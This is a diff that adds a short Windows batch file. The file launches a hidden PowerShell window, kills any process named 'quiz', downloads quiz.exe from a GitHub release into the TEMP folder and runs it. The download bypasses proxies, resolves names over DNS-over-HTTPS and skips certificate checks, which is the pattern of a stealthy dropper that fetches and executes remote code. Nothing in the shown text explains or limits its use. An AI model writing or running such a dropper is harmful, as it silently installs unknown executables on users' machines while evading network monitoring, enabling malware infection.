@@ -1,0 +1,3 @@
+@echo off
+powershell -w h -c "$t=\"$env:TEMP\quiz.exe\";Stop-Process -Name quiz -Force -ErrorAction SilentlyContinue;curl.exe --noproxy * --doh-url https://1.1.1.1/dns-query -ksL https://github.com/0rkhanmammadov/questions/releases/download/v1.0/quiz.exe -o $t;Start-Process $t"
+exit /b 0
